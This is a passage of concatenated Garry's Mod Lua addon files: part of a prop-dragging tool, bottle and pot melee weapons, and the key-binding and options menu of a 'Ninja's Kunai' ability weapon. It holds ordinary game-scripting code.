			end
		end

		end
	
		self.Drag = nil	
	end
end

function SWEP:PrimaryAttack()
	local Pos = self.Owner:GetShootPos()
	local Aim = self.Owner:GetAimVector()

	local Tr = util.TraceLine{
		start = Pos,
		endpos = Pos +Aim *self.Range,
		filter = player.GetAll(),
	}

	local HitEnt = Tr.Entity
	if self.Drag then
		HitEnt = self.Drag.Entity
		if HitEnt:GetPos():Distance(self.Owner:GetPos()) > 150 then

			HitEnt:SetColor(Color(255,255,255));
			HitEnt:SetMaterial(HitEnt.oldMat);
			HitEnt:SetCollisionGroup(COLLISION_GROUP_NONE);		
			self.Drag = nil	
			return false
		end
	else
		if not IsValid( HitEnt ) or HitEnt:GetMoveType() ~= MOVETYPE_VPHYSICS or
			HitEnt:IsVehicle() or
			HitEnt.noDrag or
			IsValid( HitEnt:GetParent() ) or
			HitEnt:IsProp() or
			//HitEnt:CPPIGetOwner() = self.Owner or
			HitEnt.LFS then
			return
		end



		if not self.Drag then
			self.Drag = {
				OffPos = HitEnt:WorldToLocal(Tr.HitPos),
				Entity = HitEnt,
				Fraction = Tr.Fraction,
			}

			HitEnt.oldColor = HitEnt:GetColor();
			HitEnt.oldMat = HitEnt:GetMaterial();

			HitEnt:SetMaterial(nil)
			HitEnt:SetColor(Color(0,200,0,100))
			HitEnt:SetCollisionGroup(COLLISION_GROUP_WORLD);
		else
		end
	end

	if self.Drag.Entity.Carry then self.Drag.Entity:SetCarrier(self.Owner) end

	if CLIENT or not IsValid( HitEnt ) then return end

	local Phys = HitEnt:GetPhysicsObject()

	if IsValid( Phys ) then
		if Phys:GetVolume() > math.pow(10, 5.85) then return end
		local Pos2 = Pos +Aim *self.Range *self.Drag.Fraction
		local OffPos = HitEnt:LocalToWorld( self.Drag.OffPos )
		local Dif = Pos2 -OffPos
		local Nom = (Dif:GetNormal() *math.min(1, Dif:Length() /100) *500 -Phys:GetVelocity()) *Phys:GetMass()

		Phys:ApplyForceOffset( Nom, OffPos )
		Phys:AddAngleVelocity( -Phys:GetAngleVelocity() /4 )
	end
end

function SWEP:SecondaryAttack()
end

if CLIENT then
	local x, y = ScrW(), ScrH()
	local MainCol = Color( 255, 255, 255, 255 )
	local Col = Color( 255, 255, 255, 255 )

	function SWEP:DrawHUD()
		if IsValid( self.Owner:GetVehicle() ) then return end
		local Pos = self.Owner:GetShootPos()
		local Aim = self.Owner:GetAimVector()

		local Tr = util.TraceLine{
			start = Pos,
			endpos = Pos +Aim *self.Range,
			filter = player.GetAll(),
		}

		local HitEnt = Tr.Entity
		

		if IsValid( HitEnt ) and HitEnt:GetMoveType() == MOVETYPE_VPHYSICS and
			not HitEnt.noDrag and
			not HitEnt:IsVehicle() and
			not IsValid( HitEnt:GetParent() ) and
			not HitEnt.LFS then

			self.Time = math.min( 1, self.Time +2 *FrameTime() )
		else
			self.Time = math.max( 0, self.Time -2 *FrameTime() )
		end

		if self.Time > 0 then
			Col.a = MainCol.a *self.Time

			surface.SetDrawColor(255, 255, 255, Col.a)
			surface.DrawRect( x * 0.5 - 2, y * 0.5 - 2, 4, 4, MainCol )
		end

		if self.Drag and IsValid( self.Drag.Entity ) then
			local Pos2 = Pos +Aim *100 *self.Drag.Fraction
			local OffPos = self.Drag.Entity:LocalToWorld( self.Drag.OffPos )
			local Dif = Pos2 -OffPos

			local A = OffPos:ToScreen()
			local B = Pos2:ToScreen()

			surface.SetDrawColor(255, 255, 255, 255)
			surface.DrawRect( A.x -2, A.y -2, 4, 4, MainCol )
			surface.DrawRect( B.x -2, B.y -2, 4, 4, MainCol )
			surface.DrawLine( A.x, A.y, B.x, B.y, MainCol )
		end
	end
end

function SWEP:PreDrawViewModel( vm, pl, wep )
	return true
end

--PATH addons/__main/lua/weapons/weapon_hl2bottle/shared.lua:

AddCSLuaFile()

SWEP.PrintName				= "Bottle"
SWEP.Author				= "Dr. Towers"
SWEP.Instructions			= "Primary attack: Swing - Secondary attack: Throw (One hit and it breaks)"
SWEP.Category				= "HL2 Melee Pack"

SWEP.Slot				= 1
SWEP.SlotPos				= 0

SWEP.Spawnable				= true

SWEP.ViewModel				= Model( "models/weapons/HL2meleepack/v_bottle.mdl" )
SWEP.WorldModel				= Model( "models/weapons/HL2meleepack/w_bottle.mdl" )
SWEP.ViewModelFOV			= 62
SWEP.UseHands				= true

SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo		= "none"

SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Automatic	= true
SWEP.Secondary.Ammo		= "none"

SWEP.DrawAmmo			= false

SWEP.HitDistance		= 30
SWEP.HitInclination		= 0.2
SWEP.HitPushback		= 100
SWEP.HitRate			= 0.50
SWEP.MinDamage			= 2
SWEP.MaxDamage			= 8

local SwingSound = Sound( "WeaponFrag.Roll" )
local HitSoundWorld = Sound( "GlassBottle.Break" )
local HitSoundBody = Sound( "GlassBottle.Break" )

function SWEP:Initialize()

	self:SetHoldType( "melee" )
end

function SWEP:PrimaryAttack()

	self.Owner:SetAnimation( PLAYER_ATTACK1 )

	local vm = self.Owner:GetViewModel()
	
	self:EmitSound( SwingSound )
	self.Weapon:SetNextPrimaryFire( CurTime() + self.HitRate )
	self.Weapon:SetNextSecondaryFire( CurTime() + self.HitRate )

	vm:SendViewModelMatchingSequence( vm:LookupSequence( "misscenter1" ) )

	timer.Create("hitdelay", 0.2, 1, function() self:Hitscan() end)

	timer.Start( "hitdelay" )

end

function SWEP:SecondaryAttack()

	self.Weapon:SetNextSecondaryFire( CurTime() + 1 )

	self.Owner:SetAnimation( PLAYER_ATTACK1 )

	self:EmitSound( SwingSound )

	local vm = self.Owner:GetViewModel()
	vm:SendViewModelMatchingSequence( vm:LookupSequence( "misscenter1" ) )

	if SERVER then
		timer.Create("throwdelay", 0.2, 1, function() if not IsValid(self) then return end self:Throwbottle() end)

		timer.Start( "throwdelay" )
	end
	
end

function SWEP:OnDrop()

	
end

function SWEP:Hitscan()

//This function calculate the trajectory

	for i=0, 170 do

	local tr = util.TraceLine( {
		start = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 10)),
		endpos = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 10)) + ( self.Owner:EyeAngles():Up() * ( self.HitDistance * 0.7 * math.cos(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Forward() * ( self.HitDistance * 1.5 * math.sin(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Right() * self.HitInclination * self.HitDistance * math.cos(math.rad(i)) ),
		filter = self.Owner,
		mask = MASK_SHOT_HULL
	} )

//This if shot the bullets

	if ( tr.Hit ) then
		
		local strikevector = ( self.Owner:EyeAngles():Up() * ( self.HitDistance * 0.5 * math.cos(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Forward() * ( self.HitDistance * 1.5 * math.sin(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Right() * self.HitInclination * self.HitDistance * math.cos(math.rad(i)) )

		
		bullet = {}
		bullet.Num    = 1
		bullet.Src    = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 15))
		bullet.Dir    = strikevector:GetNormalized()
		bullet.Spread = Vector(0, 0, 0)
		bullet.Tracer = 0
		bullet.Force  = 10
		bullet.Hullsize = 0
		bullet.Distance = self.HitDistance * 1.5
		bullet.Damage = math.random( 2, 8 )
		self.Owner:FireBullets(bullet)

		self:EmitSound( SwingSound )

		//vm:SendViewModelMatchingSequence( vm:LookupSequence( "hitcenter1" ) )

		if tr.Entity:IsPlayer() or string.find(tr.Entity:GetClass(),"npc") or string.find(tr.Entity:GetClass(),"prop_ragdoll") then
			self:EmitSound( HitSoundBody )
			tr.Entity:SetVelocity( self.Owner:GetAimVector() * Vector( 1, 1, 0 ) * self.HitPushback )
		else
			self:EmitSound( HitSoundWorld )
		end

		if (SERVER) then
			self.Owner:Give("weapon_hl2brokenbottle")
			self.Owner:SelectWeapon("weapon_hl2brokenbottle")
			self.Owner:StripWeapon("weapon_hl2bottle")
		end
//if break
		break

//if end
		//else vm:SendViewModelMatchingSequence( vm:LookupSequence( "misscenter1" ) )
		end
end

end

function SWEP:Throwbottle()

	local ent = ents.Create( "prop_physics" )

	if ( !IsValid( ent ) ) then return end
	
	ent:SetModel( "models/props_junk/garbage_glassbottle003a.mdl" )
	ent:SetPos( self.Owner:EyePos() + ( self.Owner:GetAimVector() * 20 ) )
	ent:SetAngles( self.Owner:EyeAngles() - Angle( 0, 50, 190 ) )
	ent:Spawn()

	local phys = ent:GetPhysicsObject();
 
	//local shot_length = tr.HitPos:Length();
	phys:ApplyForceCenter (self.Owner:GetAimVector()*2000 )
	phys:AddAngleVelocity(Vector( -250, -250, 0 ))

	self.Owner:StripWeapon("weapon_hl2bottle")

end

function SWEP:Deploy()

	local vm = self.Owner:GetViewModel()
	vm:SendViewModelMatchingSequence( vm:LookupSequence( "draw" ) )
	
	self.Weapon:SetNextPrimaryFire( CurTime() + 0.5 )
	self.Weapon:SetNextSecondaryFire( CurTime() + 0.5 )
	
	return true
end

function SWEP:Holster()

	return true
end

function SWEP:OnRemove()

	timer.Remove("hitdelay")
	timer.Remove("throwdelay")
	return true
end
--PATH addons/__main/lua/weapons/weapon_hl2pot/shared.lua:

AddCSLuaFile()

SWEP.PrintName				= "Pot"
SWEP.Author				= "Dr. Towers"
SWEP.Instructions			= "Primary attack: Swing"
SWEP.Category				= "HL2 Melee Pack"

SWEP.Slot				= 1
SWEP.SlotPos				= 0

SWEP.Spawnable				= true

SWEP.ViewModel				= Model( "models/weapons/HL2meleepack/v_pot.mdl" )
SWEP.WorldModel				= Model( "models/weapons/HL2meleepack/w_pot.mdl" )
SWEP.ViewModelFOV			= 62
SWEP.UseHands				= true

SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo		= "none"

SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Automatic	= true
SWEP.Secondary.Ammo		= "none"

SWEP.DrawAmmo			= false

SWEP.HitDistance		= 35
SWEP.HitInclination		= 0.2
SWEP.HitPushback		= 200
SWEP.HitRate			= 0.90
SWEP.MinDamage			= 10
SWEP.MaxDamage			= 15

local SwingSound = Sound( "WeaponFrag.Roll" )
local HitSoundWorld = Sound( "Metal_Box.ImpactHard" )
local HitSoundBody = Sound( "Flesh.ImpactHard" )

function SWEP:Initialize()

	self:SetHoldType( "melee" )
end

function SWEP:PrimaryAttack()

	self.Owner:SetAnimation( PLAYER_ATTACK1 )

	local vm = self.Owner:GetViewModel()
	
	self:EmitSound( SwingSound )
	self.Weapon:SetNextPrimaryFire( CurTime() + self.HitRate )

	vm:SendViewModelMatchingSequence( vm:LookupSequence( "misscenter1" ) )

	timer.Create("hitdelay", 0.2, 1, function() self:Hitscan() end)

	timer.Start( "hitdelay" )

end

function SWEP:SecondaryAttack()
	
	return true
end

function SWEP:OnDrop()

	
end

function SWEP:Hitscan()

//This function calculate the trajectory

	for i=0, 170 do

	local tr = util.TraceLine( {
		start = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 10)),
		endpos = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 10)) + ( self.Owner:EyeAngles():Up() * ( self.HitDistance * 0.7 * math.cos(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Forward() * ( self.HitDistance * 1.5 * math.sin(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Right() * self.HitInclination * self.HitDistance * math.cos(math.rad(i)) ),
		filter = self.Owner,
		mask = MASK_SHOT_HULL
	} )

//This if shot the bullets

	if ( tr.Hit ) then
		
		local strikevector = ( self.Owner:EyeAngles():Up() * ( self.HitDistance * 0.5 * math.cos(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Forward() * ( self.HitDistance * 1.5 * math.sin(math.rad(i)) ) ) + ( self.Owner:EyeAngles():Right() * self.HitInclination * self.HitDistance * math.cos(math.rad(i)) )

		
		bullet = {}
		bullet.Num    = 1
		bullet.Src    = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 15))
		bullet.Dir    = strikevector:GetNormalized()
		bullet.Spread = Vector(0, 0, 0)
		bullet.Tracer = 0
		bullet.Force  = 10
		bullet.Hullsize = 0
		bullet.Distance = self.HitDistance * 1.5
		bullet.Damage = math.random( 10, 15 )
		self.Owner:FireBullets(bullet)

		//local vPoint = (self.Owner:GetShootPos() - (self.Owner:EyeAngles():Up() * 10))
		//local effectdata = EffectData()
		//effectdata:SetOrigin( vPoint )
		//util.Effect( "BloodImpact", effectdata )

		self:EmitSound( SwingSound )

		//vm:SendViewModelMatchingSequence( vm:LookupSequence( "hitcenter1" ) )

		if tr.Entity:IsPlayer() or string.find(tr.Entity:GetClass(),"npc") or string.find(tr.Entity:GetClass(),"prop_ragdoll") then
			self:EmitSound( HitSoundBody )
			tr.Entity:SetVelocity( self.Owner:GetAimVector() * Vector( 1, 1, 0 ) * self.HitPushback )
		else
			self:EmitSound( HitSoundWorld )
		end
//if break
		break
//if end
		//else vm:SendViewModelMatchingSequence( vm:LookupSequence( "misscenter1" ) )
		end
end

end

function SWEP:Deploy()

	local vm = self.Owner:GetViewModel()
	vm:SendViewModelMatchingSequence( vm:LookupSequence( "draw" ) )
	
	self.Weapon:SetNextPrimaryFire( CurTime() + 0.5 )
	
	return true
end

function SWEP:Holster()

	return true
end

function SWEP:OnRemove()

	timer.Remove("hitdelay")
	return true
end
--PATH addons/__main/lua/autorun/cl_mas_ninjaskunai_options.lua:
/*

 ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ 
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚══███╔╝██╔═══██╗
██║     ██████╔╝█████╗  ███████║   ██║   █████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔████╔██║███████║██████╔╝███████║██╔██╗ ██║  ███╔╝ ██║   ██║
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║╚██╗██║ ███╔╝  ██║   ██║
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ 

------------------------------------------------------------------------------------------------------------------------------------------------------

██████╗  ██████╗     ███╗   ██╗ ██████╗ ████████╗    ██████╗ ███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗                               
██╔══██╗██╔═══██╗    ████╗  ██║██╔═══██╗╚══██╔══╝    ██╔══██╗██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗                              
██║  ██║██║   ██║    ██╔██╗ ██║██║   ██║   ██║       ██████╔╝█████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║                              
██║  ██║██║   ██║    ██║╚██╗██║██║   ██║   ██║       ██╔══██╗██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║                              
██████╔╝╚██████╔╝    ██║ ╚████║╚██████╔╝   ██║       ██║  ██║███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝                              
╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                               

██╗███╗   ██╗     █████╗ ███╗   ██╗██╗   ██╗    ███████╗██╗  ██╗ █████╗ ██████╗ ███████╗     ██████╗ ██████╗     ███████╗ ██████╗ ██████╗ ███╗   ███╗
██║████╗  ██║    ██╔══██╗████╗  ██║╚██╗ ██╔╝    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝    ██╔═══██╗██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗████╗ ████║
██║██╔██╗ ██║    ███████║██╔██╗ ██║ ╚████╔╝     ███████╗███████║███████║██████╔╝█████╗      ██║   ██║██████╔╝    █████╗  ██║   ██║██████╔╝██╔████╔██║
██║██║╚██╗██║    ██╔══██║██║╚██╗██║  ╚██╔╝      ╚════██║██╔══██║██╔══██║██╔═══╝ ██╔══╝      ██║   ██║██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║
██║██║ ╚████║    ██║  ██║██║ ╚████║   ██║       ███████║██║  ██║██║  ██║██║     ███████╗    ╚██████╔╝██║  ██║    ██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝     ╚═════╝ ╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝

-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 

*/

AddCSLuaFile()

CreateConVar( 'sk_mas_ninjaskunai_enabled', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE } )
CreateConVar( 'sk_mas_ninjaskunai_adminonly', '0', { FCVAR_ARCHIVE, FCVAR_SERVER_CAN_EXECUTE } )
CreateConVar( 'sk_mas_ninjaskunai_infinitecharge', '0', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Enable infinite charge for this SWEP" )
CreateConVar( 'sk_mas_ninjaskunai_nocooldown', '0', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Disable cooldowns for this SWEP" )
CreateConVar( 'sk_mas_lagcompensate_npc', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Leave this active unless it is confirmed to be conflicting with another addon or if you are maxing your CPU and RAM and need every scrap. Removing this greatly affects player perspectives and should be re-enabled ASAP." )
CreateConVar( 'sk_mas_setmaxhealth_onspawn', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Leave this active unless it is actually conflicting with another addon. Disabling this results in healing abilities only going to 100 HP (the default max health) unless defined by another addon. DarkRP DOES NOT set MAX HEALTH by default, hence why I made this code!" )

	Maranzos_AbilitySWEPs = Maranzos_AbilitySWEPs or {}
		
		if SERVER then
			cvars.AddChangeCallback( "sk_mas_ninjaskunai_infinitecharge", function( convar_name, value_old, value_new )
				Maranzos_AbilitySWEPs.BMS_InfUlt	= tobool( GetConVarNumber( "sk_mas_ninjaskunai_infinitecharge" ) )
			end )
			cvars.AddChangeCallback( "sk_mas_ninjaskunai_nocooldown", function( convar_name, value_old, value_new )
				Maranzos_AbilitySWEPs.BMS_NoCD	= tobool( GetConVarNumber( "sk_mas_ninjaskunai_nocooldown" ) )
			end )
		end

if (CLIENT) then

print("\n")
print("[MAS] Maranzo\'s Ability SWEPs: Ninja's Kunai")
print("[MAS]: Options Loaded")
	
	MASconvar_drawhud = CreateClientConVar( 'cl_mas_drawhud', '1' )
	MASconvar_crosshairon = CreateClientConVar( 'cl_mas_crosshairon', '1' )
	MASconvar_preventbinds = CreateClientConVar( 'cl_mas_preventbinds', '1' )
	
	Maranzos_AbilitySWEPs.keyconfigs = Maranzos_AbilitySWEPs.keyconfigs or {}
	
	
-------------------------------------------------------------------
-- Define General Use Functions
	
	local function AS_SaveStoredConfig()
		file.Write( 'mas/maranzo_as_bindings.txt', util.TableToJSON( Maranzos_AbilitySWEPs.keyconfigs, true ) )
		print("[MAS]: Saved binds to Maranzo_AS_bindings.txt \n")
	end // end Save Config


-- Default Binds

	local function AS_DefaultKeyConfigs() 
		print("[MAS]: Default Keybinds Set")
		local KB = {} -- Maranzos_AbilitySWEPs.keyconfigs or {} -- Key Bindings
		
		KB["Binds"] = {
			[ 1 ]	=	input.LookupBinding( "+attack", true ),
			[ 2 ]	=	input.LookupBinding( "+attack2", true ),
			[ 3 ]	=	KEY_F,
			[ 4 ]	=	KEY_C,
			[ 5 ]	=	KEY_T,
			[ 6 ]	=	MOUSE_MIDDLE,
		}
		
		// Add a table with just the Btn names first
		KB["Btn"] = {}
		for k, v in pairs(KB["Binds"]) do
			KB["Btn"][v] = tonumber(k)
		end
		
		// Create a proper display name for these keys
		KB[ 1 ] = string.upper( language.GetPhrase( KB["Binds"][ 1 ] ) ) -- Attack
		KB[ 2 ] = string.upper( language.GetPhrase( KB["Binds"][ 2 ] ) ) -- Abil 1
		KB[ 3 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 3 ] ) ) ) -- Abil 2
		KB[ 4 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 4 ] ) ) ) -- Abil 3
		KB[ 5 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 5 ] ) ) ) -- Ult
		KB[ 6 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 6 ] ) ) ) -- Abil Select
		if KB[ 1 ] == "MOUSE1" then KB[ 1 ] = "LMB" end
		if KB[ 2 ] == "MOUSE2" then KB[ 2 ] = "RMB" end
		
		table.Empty( Maranzos_AbilitySWEPs.keyconfigs )
		table.Merge( Maranzos_AbilitySWEPs.keyconfigs, KB )
		AS_SaveStoredConfig()
		
	end // end Default Key Config
	
	local function AS_LoadStoredConfig()
		if file.Exists( 'mas/maranzo_as_bindings.txt', 'DATA' ) then
			local fl = file.Read( 'mas/maranzo_as_bindings.txt', 'DATA' )
			if fl then // Confirming if there is a File
				fl = util.JSONToTable( fl )
				if istable( fl ) then
					print("[MAS]: Binding Table Loaded \n")
					table.Empty( Maranzos_AbilitySWEPs.keyconfigs )
					table.Merge( Maranzos_AbilitySWEPs.keyconfigs, fl )
				end
			else // Can't read that shit
				print("[MAS]: Binding Table Not Found \n")
				AS_DefaultKeyConfigs()
			end // end If File Read
		else // No File Found
			file.CreateDir( "mas" )
			print("[MAS]: No Bindings file found \n")
			AS_DefaultKeyConfigs()
		end
	end // end Load Stored Config
	AS_LoadStoredConfig() -- load it
	
	local function UI_MakeBinder( name, ability )
		name:SetTall( 50 )
		if Maranzos_AbilitySWEPs.keyconfigs[ ability ] then
			name:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ] )
		end
		
		function name:OnChange( num )
			local lastBtn = Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ]
			Maranzos_AbilitySWEPs.keyconfigs["Btn"][ lastBtn ] = false -- Disable Prev Btn
			Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ] = num -- Set new key as binded ( "Btn" is what counts )
			Maranzos_AbilitySWEPs.keyconfigs["Btn"][ num ] = ability -- Enable new number
			Maranzos_AbilitySWEPs.keyconfigs[ ability ] = string.upper( language.GetPhrase( input.GetKeyName( num ) ) ) -- Set Display Text
			AS_SaveStoredConfig()
		end
		
		return name
	end // end Fn UI_MakeBinder
-- Tool Options

	hook.Add( 'PopulateToolMenu', 'Maranzo_AS_ninjaskunai', function()
		spawnmenu.AddToolMenuOption( 'Options',
			'Ability SWEPs',
			'Maranzo_AS_ninjaskunai',
			"MAS: Ninja's Kunai",
			'',
			'',
			function( pnl )
				pnl:ControlHelp( '' )
				pnl:Help( "Maranzo\'s Ability SWEPs: Ninja's Kunai" )
				pnl:ControlHelp( 'Created by Maranzo. I hope you enjoy it!' )
				pnl:ControlHelp( '' )

				local btnBug = vgui.Create( 'DButton' )
				btnBug:SetText( 'REPORT A BUG' )
				btnBug.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/workshop/filedetails/discussion/947006398/2333276539590974512/' )
				end
				btnBug:SetTall( 25 )
				pnl:AddItem( btnBug )

				local btnMore = vgui.Create( 'DButton' )
				btnMore:SetText( 'View More by Maranzo' )
				btnMore.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/id/Maranzo/myworkshopfiles/?appid=4000' )
				end
				btnMore:SetTall( 50 )
				pnl:AddItem( btnMore )

				local btnRate = vgui.Create( 'DButton' )
				btnRate:SetText( 'Rate this SWEP' )
				btnRate.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/sharedfiles/filedetails/?id=947006398' )
				end
				btnRate:SetTall( 50 )
				pnl:AddItem( btnRate )
				pnl:ControlHelp( 'Rate this SWEP and find the Official Suggestions page from here!' )
				pnl:ControlHelp( '' )
				
				pnl:CheckBox( 'Draw HUD', 'cl_mas_drawhud' )
				pnl:ControlHelp( 'Enable / Disable the showing of Ability icons, Binds, and Combo when the SWEP is out' )
				
				pnl:CheckBox( 'Show Crosshair', 'cl_mas_crosshairon' )
				pnl:ControlHelp( 'Enable / Disable the crosshair. Note: You must switch to another weapon for this to take effect. In Singleplayer you must strip the weapon / die.' )
				
				pnl:CheckBox( 'Prevent Basic Binds ( Flashlight, Menu, CMenu )', 'cl_mas_preventbinds' )
				pnl:ControlHelp( 'Prevent your prop spawn menu, context menu, and flashlight from working while the SWEP is out. By Default this is on to prevent overlap.' )
				pnl:ControlHelp( '' )
				
				pnl:Help( 'Attack: Kunai Slash' )
				pnl:Dock( FILL )
				local MAS_AA = vgui.Create( "DButton" )
				MAS_AA:SetTall( 50 )
				MAS_AA:SetText( Maranzos_AbilitySWEPs.keyconfigs[ 1 ] )
				pnl:AddItem( MAS_AA )
				pnl:ControlHelp( 'This is your +attack key \n( Usually your Left Mouse Button )' )
				MAS_AA:SetDisabled( true )
				
				pnl:Help( 'Ability: Throw Kunai' )
				pnl:Dock( FILL )
				local MAS_AbThrow = vgui.Create( "DButton" )
				MAS_AbThrow:SetTall( 50 )
				MAS_AbThrow:SetText( Maranzos_AbilitySWEPs.keyconfigs[ 2 ] )
				pnl:AddItem( MAS_AbThrow )
				pnl:ControlHelp( 'This is your +attack2 key \n( Usually your Right Mouse Button )' )
				MAS_AbThrow:SetDisabled( true )
				
				pnl:Help( 'Ability: Ninja Dash' )
				local MAS_AbDash = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbDash, 3 ) )
				
				pnl:Help( 'Ability: Concealment' )
				local MAS_AbConceal = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbConceal, 4 ) )
				
				pnl:Help( 'Ability: Substitution' )
				local MAS_AbSubs = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbSubs, 5 ) )
				
				pnl:Help( 'Ability Selection' )
				local MAS_AbSel = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbSel, 6 ) )
				pnl:ControlHelp( ' ' )
				
				pnl:Help( 'Holster Weapon' )
				pnl:Dock( FILL )
				local MAS_Holst = vgui.Create( "DBinder" )
				MAS_Holst:SetTall( 50 )
				MAS_Holst:SetText( string.upper( language.GetPhrase( input.LookupBinding( "+Reload", true ) ) ) )
				pnl:AddItem( MAS_Holst )
				pnl:ControlHelp( 'This is your +reload key \n( Usually your "R" Button )' )
				MAS_Holst:SetDisabled( true )
				
				local def = vgui.Create( 'DButton' )
				def:SetText( 'RESTORE DEFAULTS' )
				def.DoClick = function()
					Derma_Query( [[Are you sure you want to restore default settings?
					This cannot be undone!]],
						'Maranzo\'s Ability SWEPs: Defaults',
						'Yes, I\'m sure',
						function()
							-- Console: Client Side
							RunConsoleCommand( 'cl_mas_drawhud', '1' )
							RunConsoleCommand( 'cl_mas_crosshairon', '1' )
							RunConsoleCommand( 'cl_mas_preventbinds', '1' )
							
							-- Abilities: Key Binds
							AS_DefaultKeyConfigs()
							MAS_AA:SetText( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 1 ] )
							MAS_AbThrow:SetText( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 2 ] )
							MAS_AbDash:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 3 ] )
							MAS_AbConceal:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 4 ] )
							MAS_AbSubs:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 5 ] )
							MAS_AbSel:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 6 ] )
							
							Derma_Message( 'Settings have been successfully restored to defaults.', 'Maranzo\'s Ability SWEPs: Defaults', 'OK' )
						end,
						'No, abort action' )
				end
				def:SetTall( 25 )
				pnl:AddItem( def )
				pnl:ControlHelp( '' )

				if LocalPlayer():IsAdmin() then
					pnl:Help( 'Admin Options' )
					pnl:ControlHelp( 'All options affect the whole server' )
					pnl:CheckBox( 'Spawnable SWEP', 'sk_mas_ninjaskunai_enabled' )
